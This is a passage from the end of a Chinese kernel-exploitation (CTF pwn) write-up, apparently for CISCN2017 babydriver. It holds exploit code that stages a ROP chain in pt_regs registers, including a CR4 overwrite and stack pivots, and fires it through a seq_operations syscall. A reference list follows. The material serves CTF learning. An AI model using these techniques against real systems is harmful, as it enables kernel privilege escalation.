    rop[p++] = user_ss;


    // 布置好pt_regs结构体。
    // 通过add_rsp_0x150，迁移到这里，执行其中的一小段rop后，再次迁移到我们上面布置的rop链~
    info("Preparing pt_regs...");
    __asm__(
       "mov r15, 0xbeefdead;"
       "mov r14, 0xdeadbeaf;"
       "mov r13, mov_cr4_rdi_pop_rbp_ret;"
       "mov r12, 0x6f0;"
       "mov rbp, add_rsp_0x48_ret;"
       "mov rbx, pop_rdi_ret;"
       "mov r11, 0x66666666;"
       "mov r10, 0xdeadbeaf;" 
       "mov r9,  pop_rsp_ret;" // 后半部分
       "mov r8,  function;"
       "xor rax, rax;"
       "mov rcx, 0xaaaaaaaa;"
       "mov rdx, 8;"
       "mov rsi, rsp;"
       "mov rdi, seq_fd;"        // 通过 seq_operations->stat 来触发
       "syscall;"
    );

    return 0;
}
```



## 0x0?. 参考内容

[arttnba3师傅的博客](https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I)

[【kernel-pwn】一题多解：从CISCN2017-babydriver入门题带你学习tty_struct、seq_file、msg_msg、pt_regs的利用_ciscn 2017 babydrive-CSDN博客](https://blog.csdn.net/qq_61670993/article/details/133414825)
